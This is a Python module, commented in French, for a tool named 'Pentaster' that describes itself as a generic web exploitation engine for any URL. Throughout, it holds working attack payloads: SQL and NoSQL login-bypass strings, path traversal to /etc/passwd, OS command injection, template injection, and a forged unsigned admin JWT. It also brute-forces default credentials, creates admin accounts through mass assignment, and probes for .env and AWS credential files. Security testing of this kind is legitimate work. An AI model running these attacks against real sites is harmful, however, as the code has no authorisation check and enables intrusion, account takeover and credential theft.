"""Pentaster — moteur d'exploitation web GÉNÉRIQUE.

Contrairement à `solvers.py` (spécifique à OWASP Juice Shop), ce module ne
connaît aucune cible en particulier : chaque technique teste une CLASSE de
vulnérabilité (SQLi, IDOR, path traversal, JWT alg:none, mass-assignment…)
contre une URL arbitraire et confirme la vulnérabilité par analyse de la
réponse — sans jamais dépendre d'un endpoint propre à une application.

Utilisable tel quel sur n'importe quel site : `run_techniques("https://cible")`.
"""
from __future__ import annotations

import base64
import json
import re
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Callable


@dataclass
class Finding:
    technique: str
    severity: str            # info | low | medium | high | critical
    url: str
    evidence: str = ""
    confirmed: bool = True
    raw: dict = field(default_factory=dict)


class Http:
    """Client HTTP minimal, agnostique de la cible."""

    def __init__(self, base: str):
        self.base = base.rstrip("/")

    def request(self, method, path, *, headers=None, data=None, raw=False):
        url = path if path.startswith("http") else self.base + path
        hdrs = {"User-Agent": "Pentaster/1.0"}
        if data is not None and not raw:
            hdrs["Content-Type"] = "application/json"
        if headers:
            hdrs.update(headers)
        body = None
        if data is not None:
            body = data.encode() if isinstance(data, str) else (
                data if raw else json.dumps(data).encode())
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                return r.status, dict(r.headers), r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, dict(e.headers), e.read().decode("utf-8", "replace")
        except Exception as e:  # noqa: BLE001
            return -1, {}, str(e)

    def get(self, path, **kw):
        return self.request("GET", path, **kw)

    def post(self, path, **kw):
        return self.request("POST", path, **kw)


# ------------------------- Techniques génériques -------------------------

def _is_spa_shell(body: str) -> bool:
    """Vrai si la réponse est vraisemblablement la coquille HTML d'une SPA
    (beaucoup d'apps renvoient index.html en 200 pour tout chemin inconnu)."""
    head = body[:600].lower()
    return ("<!doctype html" in head or "<html" in head
            or "<app-root" in head or "<div id=\"root\"" in head)


SENSITIVE_PATHS = {
    "/.env": r"[A-Z0-9_]+=",
    "/.git/config": r"\[core\]|\[remote",
    "/.git/HEAD": r"ref:\s*refs/",
    "/.aws/credentials": r"aws_access_key_id",
    "/config.json": r"[{].*[}]",
    "/package.json": r'"dependencies"|"name"\s*:',
    "/wp-config.php.bak": r"DB_PASSWORD|define\(",
    "/server-status": r"Apache Server Status",
    "/phpinfo.php": r"phpinfo\(\)|PHP Version",
    "/.well-known/security.txt": r"Contact:",
    "/backup.zip": r"PK\x03\x04",
    "/robots.txt": r"Disallow:",
}


def t_sensitive_files(http: Http) -> list[Finding]:
    out = []
    for path, sig in SENSITIVE_PATHS.items():
        st, _, body = http.get(path)
        if st == 200 and not _is_spa_shell(body) and re.search(sig, body[:4000], re.I | re.S):
            sev = "high" if path in ("/.env", "/.git/config", "/.aws/credentials",
                                     "/wp-config.php.bak") else "medium"
            out.append(Finding("sensitive-file-exposure", sev, http.base + path,
                               f"HTTP 200, signature attendue présente ({path})"))
    return out


LOGIN_ENDPOINTS = ["/rest/user/login", "/api/login", "/api/auth/login",
                   "/login", "/api/users/login", "/auth/login", "/session"]
SQLI_PAYLOADS = ["' OR '1'='1'--", "' OR true--", "admin'--", "') OR ('1'='1"]


def t_sqli_auth_bypass(http: Http) -> list[Finding]:
    out = []
    for ep in LOGIN_ENDPOINTS:
        # Référence : identifiants bidon → doit échouer.
        base_st, _, _ = http.post(ep, data={"email": "nobody@nope.tld",
                                             "password": "definitely-wrong-xyz"})
        if base_st in (-1, 404):
            continue
        for pl in SQLI_PAYLOADS:
            for field_name in ("email", "username"):
                st, _, body = http.post(ep, data={field_name: pl, "password": pl})
                low = body.lower()
                ok = st == 200 and ("token" in low or "authentication" in low
                                    or "jwt" in low or "sessionid" in low)
                if ok and st != base_st:
                    out.append(Finding("sql-injection-auth-bypass", "critical",
                                       http.base + ep,
                                       f"Payload `{pl}` sur `{field_name}` → 200 + jeton (réf. {base_st})"))
                    return out
    return out


def t_error_based_sqli(http: Http) -> list[Finding]:
    """Injection d'une quote dans des paramètres courants → erreur SQL."""
    sqlerr = re.compile(r"SQLITE_ERROR|SQL syntax|ORA-\d|psql:|MySQL|"
                        r"unterminated quoted|SequelizeDatabaseError|SQLITE", re.I)
    params = ["q", "search", "id", "name", "query", "email"]
    endpoints = ["/rest/products/search", "/api/products", "/search", "/products", "/api/search"]
    out = []
    for ep in endpoints:
        for p in params:
            st, _, body = http.get(f"{ep}?{p}=%27")
            if st in (-1, 404):
                continue
            if sqlerr.search(body[:4000]):
                out.append(Finding("sql-injection-error-based", "high",
                                   f"{http.base}{ep}?{p}='",
                                   f"Signature d'erreur SQL renvoyée (param `{p}`)"))
                return out
    return out


def t_path_traversal(http: Http) -> list[Finding]:
    payloads = ["../../../../../../etc/passwd",
                "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
                "....//....//....//etc/passwd"]
    bases = ["/", "/static/", "/files/", "/download?file=", "/ftp/", "/assets/"]
    passwd = re.compile(r"root:.*:0:0:")
    out = []
    for b in bases:
        for pl in payloads:
            st, _, body = http.get(b + pl)
            if st == 200 and passwd.search(body):
                out.append(Finding("path-traversal-lfi", "critical",
                                   http.base + b + pl,
                                   "Contenu de /etc/passwd divulgué"))
                return out
    return out


def t_null_byte_bypass(http: Http) -> list[Finding]:
    """Extension-filter bypass via null byte encodé (%2500)."""
    out = []
    for f in ("/ftp/package.json.bak", "/ftp/coupons.md.bak", "/backup.zip",
              "/config.bak"):
        st, _, body = http.get(f + "%2500.md")
        if st == 200 and len(body) > 0 and not _is_spa_shell(body):
            out.append(Finding("null-byte-extension-bypass", "medium",
                               http.base + f + "%2500.md",
                               "Filtre d'extension contourné via null byte (%2500)"))
    return out


def t_security_headers(http: Http) -> list[Finding]:
    st, headers, _ = http.get("/")
    if st == -1:
        return []
    lc = {k.lower(): v for k, v in headers.items()}
    missing = [h for h in ("content-security-policy", "x-frame-options",
                           "strict-transport-security", "x-content-type-options")
               if h not in lc]
    if missing:
        return [Finding("missing-security-headers", "low", http.base + "/",
                        "En-têtes absents : " + ", ".join(missing), confirmed=True)]
    return []


def t_cors_misconfig(http: Http) -> list[Finding]:
    evil = "https://evil.attacker.example"
    st, headers, _ = http.get("/", headers={"Origin": evil})
    acao = {k.lower(): v for k, v in headers.items()}.get("access-control-allow-origin", "")
    if acao == evil or acao == "*":
        return [Finding("cors-misconfiguration", "medium", http.base + "/",
                        f"Access-Control-Allow-Origin reflète une origine arbitraire ({acao})")]
    return []


def t_open_redirect(http: Http) -> list[Finding]:
    evil = "https://evil.attacker.example"
    for p in ("redirect", "url", "to", "next", "returnUrl", "dest"):
        st, headers, body = http.get(f"/?{p}={urllib.parse.quote(evil)}")
        loc = {k.lower(): v for k, v in headers.items()}.get("location", "")
        if evil in loc:
            return [Finding("open-redirect", "medium", f"{http.base}/?{p}={evil}",
                            f"Redirection (Location) vers une URL externe via `{p}`")]
    return []


def t_mass_assignment(http: Http) -> list[Finding]:
    """Élévation de privilège via champ role/isAdmin à l'inscription."""
    import time
    endpoints = ["/api/Users", "/api/users", "/api/register", "/register", "/users"]
    for ep in endpoints:
        email = f"pentaster_ma_{abs(hash(http.base)) % 99999}@probe.tld"
        st, _, body = http.post(ep, data={"email": email, "password": "Passw0rd!1",
                                           "passwordRepeat": "Passw0rd!1",
                                           "role": "admin", "isAdmin": True})
        low = body.lower()
        if st in (200, 201) and ('"role":"admin"' in low.replace(" ", "")
                                 or '"isadmin":true' in low.replace(" ", "")):
            return [Finding("mass-assignment-privilege-escalation", "high",
                            http.base + ep,
                            "Le champ privilégié (role/isAdmin) a été accepté à l'inscription")]
    return []


def t_jwt_none_alg(http: Http) -> list[Finding]:
    """JWT alg:none accepté par un endpoint protégé."""
    def b64url(b):
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = b64url(json.dumps({"data": {"email": "pentaster@none.tld"},
                                 "role": "admin", "iat": 0}).encode())
    token = f"{header}.{payload}."
    for ep in ("/rest/user/whoami", "/api/me", "/api/profile", "/profile", "/api/user"):
        st, _, body = http.get(ep, headers={"Authorization": f"Bearer {token}",
                                            "Cookie": f"token={token}"})
        if st == 200 and ("none.tld" in body or "email" in body.lower()):
            return [Finding("jwt-none-algorithm", "high", http.base + ep,
                            "Un JWT non signé (alg:none) a été accepté")]
    return []


def t_verbose_errors(http: Http) -> list[Finding]:
    trace = re.compile(r"at\s+\w+.*\(.*:\d+:\d+\)|Traceback \(most recent|"
                       r"SequelizeDatabaseError|Cannot read propert|"
                       r"stack.*\n.*at ", re.I)
    for ep in ("/api/BasketItems/not-a-number", "/rest/basket/not-a-number",
               "/api/Products/@@@"):
        st, _, body = http.get(ep)
        if st >= 400 and trace.search(body[:4000]):
            return [Finding("verbose-error-disclosure", "low", http.base + ep,
                            "Trace/erreur interne divulguée sur entrée invalide")]
    return []


def t_nosql_auth_bypass(http: Http) -> list[Finding]:
    """Bypass d'authentification par opérateurs NoSQL (MongoDB)."""
    payloads = [
        {"email": {"$ne": None}, "password": {"$ne": None}},
        {"email": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$ne": None}, "password": {"$ne": None}},
    ]
    for ep in LOGIN_ENDPOINTS:
        ref, _, _ = http.post(ep, data={"email": "nobody@nope.tld", "password": "x"})
        if ref in (-1, 404):
            continue
        for pl in payloads:
            st, _, body = http.post(ep, data=pl)
            low = body.lower()
            if st == 200 and ("token" in low or "authentication" in low or "jwt" in low):
                return [Finding("nosql-injection-auth-bypass", "critical",
                                http.base + ep,
                                "Opérateur NoSQL ($ne/$gt) → authentification contournée")]
    return []


def t_reflected_xss(http: Http) -> list[Finding]:
    """Réflexion non encodée d'un marqueur dans la réponse."""
    marker = "pxss<script>t()</script>"
    enc = urllib.parse.quote(marker)
    endpoints = ["/", "/search", "/rest/products/search", "/api/search", "/index.html"]
    params = ["q", "search", "query", "s", "name", "redirect"]
    for ep in endpoints:
        for p in params:
            st, headers, body = http.get(f"{ep}?{p}={enc}")
            ct = {k.lower(): v for k, v in headers.items()}.get("content-type", "")
            if st == 200 and "html" in ct and "<script>t()</script>" in body:
                return [Finding("reflected-xss", "high", f"{http.base}{ep}?{p}=",
                                f"Marqueur réfléchi non encodé (param `{p}`)")]
    return []


DEFAULT_CREDS = [("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
                 ("administrator", "administrator"), ("root", "root"),
                 ("test", "test"), ("guest", "guest")]


def t_default_credentials(http: Http) -> list[Finding]:
    for ep in LOGIN_ENDPOINTS:
        ref, _, _ = http.post(ep, data={"email": "nobody@nope.tld", "password": "x"})
        if ref in (-1, 404):
            continue
        for user, pwd in DEFAULT_CREDS:
            for uf in ("email", "username"):
                st, _, body = http.post(ep, data={uf: user, "password": pwd})
                low = body.lower()
                if st == 200 and ("token" in low or "authentication" in low or "jwt" in low):
                    return [Finding("default-credentials", "high", http.base + ep,
                                    f"Identifiants faibles acceptés : {user}/{pwd}")]
    return []


def t_ssti(http: Http) -> list[Finding]:
    """Server-Side Template Injection — évaluation d'une expression."""
    probes = [("{{7*7}}", "49"), ("${7*7}", "49"), ("#{7*7}", "49"),
              ("<%= 7*7 %>", "49")]
    endpoints = ["/rest/products/search", "/search", "/api/search", "/"]
    for ep in endpoints:
        for expr, expect in probes:
            st, _, body = http.get(f"{ep}?q={urllib.parse.quote(expr)}")
            if st in (-1, 404) or _is_spa_shell(body):
                continue
            # Le contrôle négatif ne doit PAS produire le résultat : on exige
            # que l'expression math soit évaluée alors que le littéral disparaît.
            neg, _, nbody = http.get(f"{ep}?q={urllib.parse.quote('pz' + expr[2:])}")
            if expect in body and expr not in body and expect not in (nbody or ""):
                return [Finding("server-side-template-injection", "critical",
                                f"{http.base}{ep}?q={expr}",
                                f"Expression `{expr}` évaluée à `{expect}`")]
    return []


def t_command_injection(http: Http) -> list[Finding]:
    marker = re.compile(r"uid=\d+\(.*gid=\d+\(")
    for inj in ("; id", "| id", "`id`", "$(id)", "& id"):
        for ep in ("/rest/products/search", "/search", "/api/ping", "/ping"):
            st, _, body = http.get(f"{ep}?q={urllib.parse.quote('x' + inj)}")
            if st in (-1, 404):
                continue
            if marker.search(body):
                return [Finding("os-command-injection", "critical",
                                f"{http.base}{ep}",
                                f"Sortie de `id` observée (injection `{inj}`)")]
    return []


TECHNIQUES: list[tuple[str, Callable[[Http], list[Finding]]]] = [
    ("Sensitive file exposure", t_sensitive_files),
    ("NoSQL auth bypass", t_nosql_auth_bypass),
    ("Reflected XSS", t_reflected_xss),
    ("Default credentials", t_default_credentials),
    ("SSTI", t_ssti),
    ("OS command injection", t_command_injection),
    ("SQLi auth bypass", t_sqli_auth_bypass),
    ("SQLi (error-based)", t_error_based_sqli),
    ("Path traversal / LFI", t_path_traversal),
    ("Null-byte extension bypass", t_null_byte_bypass),
    ("Missing security headers", t_security_headers),
    ("CORS misconfiguration", t_cors_misconfig),
    ("Open redirect", t_open_redirect),
    ("Mass assignment (priv-esc)", t_mass_assignment),
    ("JWT alg:none", t_jwt_none_alg),
    ("Verbose error disclosure", t_verbose_errors),
]


def run_techniques(base_url: str, progress: Callable[[str, str, int], None] | None = None) -> dict:
    """Exécute toutes les techniques génériques contre `base_url`.

    `progress`, si fourni, est appelé `progress("start", name, 0)` avant chaque
    technique puis `progress("done", name, nb_findings)` après — ce qui permet à
    l'appelant (CLI) d'afficher une progression sans coupler ce module à `rich`.
    """
    http = Http(base_url)
    findings: list[Finding] = []
    ran: list[tuple[str, int]] = []
    for name, fn in TECHNIQUES:
        if progress:
            progress("start", name, 0)
        try:
            res = fn(http)
        except Exception:  # noqa: BLE001
            res = []
        findings.extend(res)
        ran.append((name, len(res)))
        if progress:
            progress("done", name, len(res))
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    findings.sort(key=lambda f: order.get(f.severity, 5))
    return {"target": base_url, "findings": findings, "ran": ran}
